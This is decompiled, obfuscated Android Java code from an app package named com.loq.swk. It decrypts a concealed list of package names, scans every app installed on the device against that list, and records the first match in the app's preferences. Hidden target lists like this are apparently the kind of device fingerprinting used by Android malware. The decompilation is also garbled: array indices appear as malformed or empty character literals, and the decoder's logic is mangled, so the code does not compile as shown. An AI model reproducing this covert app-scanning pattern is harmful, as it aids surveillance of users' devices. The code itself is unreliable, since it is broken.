package com.loq.swk;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.preference.PreferenceManager;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;

public final class ah
{
  private static String hu;
  private static int im;
  private static final byte[] rl;
  
  public ah() {}
  
  private static String hu()
    throws Exception
  {
    if (hu.equals(hu((byte)rl['ł'], (byte)rl[''], (byte)rl[21]).intern())) {
      return rm.hu(hu(gy.hu.length), rl(gy.hu.length));
    }
    return hu(0);
  }
  
  private static String hu(int paramInt)
  {
    return hu.substring(gy.hu.length - gy.hu.length, hu.length() - paramInt);
  }
  
  private static String hu(int paramInt1, byte paramByte, int paramInt2)
  {
    paramInt1 += 4;
    byte[] arrayOfByte1 = rl;
    int j = 0;
    int n = 0;
    int m = 9844 - paramByte * 9839;
    paramInt2 = paramInt2 * 12 + 98;
    byte[] arrayOfByte2 = new byte[m];
    int k = paramInt1;
    paramByte = paramInt2;
    if (arrayOfByte1 == null)
    {
      paramByte = m;
      j = paramInt2;
      paramInt2 = paramInt1;
      paramInt1 = n;
    }
    for (;;)
    {
      paramByte += -j;
      k = paramInt2;
      j = paramInt1;
      paramInt1 = j + 1;
      int i = (byte)paramByte;
      paramInt2 = k + 1;
      arrayOfByte2[j] = i;
      if (paramInt1 == m) {
        return new String(arrayOfByte2, 0);
      }
      j = arrayOfByte1[paramInt2];
    }
  }
  
  private static List<String> hu(Context paramContext, boolean paramBoolean)
  {
    ArrayList localArrayList = new ArrayList();
    paramContext = paramContext.getPackageManager().getInstalledPackages(gy.hu.length - gy.hu.length);
    int i = 0;
    while (i < paramContext.size())
    {
      PackageInfo localPackageInfo = (PackageInfo)paramContext.get(i);
      if ((paramBoolean) || (localPackageInfo.versionName != null)) {
        localArrayList.add(localPackageInfo.packageName);
      }
      i += 1;
    }
    return localArrayList;
  }
  
  private static void hu(Context paramContext, int paramInt)
  {
    PreferenceManager.getDefaultSharedPreferences(paramContext).edit().putInt(hu((byte)rl[79], (byte)rl[21], (byte)rl['']).intern(), paramInt).apply();
  }
  
  public static boolean hu(Context paramContext)
    throws Exception
  {
    List localList = rl(hu());
    return hu(paramContext, hu(paramContext, false), localList);
  }
  
  private static boolean hu(Context paramContext, List<String> paramList1, List<String> paramList2)
  {
    int i = 0;
    while (i < paramList1.size())
    {
      int j = 0;
      while (j < paramList2.size())
      {
        if (((String)paramList1.get(i)).equals((String)paramList2.get(j)))
        {
          hu(paramContext, j);
          return true;
        }
        j += 1;
      }
      i += 1;
    }
    return false;
  }
  
  public static boolean hu(String paramString)
    throws Exception
  {
    return hu().contains(paramString);
  }
  
  private static String rl(int paramInt)
  {
    return hu((byte)rl['ł'], (byte)rl[''], (byte)rl[21]).intern().substring(hu((byte)rl['ł'], (byte)rl[''], (byte)rl[21]).intern().length() - paramInt);
  }
  
  private static List<String> rl(String paramString)
  {
    paramString = new StringTokenizer(paramString);
    ArrayList localArrayList = new ArrayList(paramString.countTokens());
    while (paramString.hasMoreTokens()) {
      localArrayList.add(paramString.nextToken().trim());
    }
    return localArrayList;
  }
}
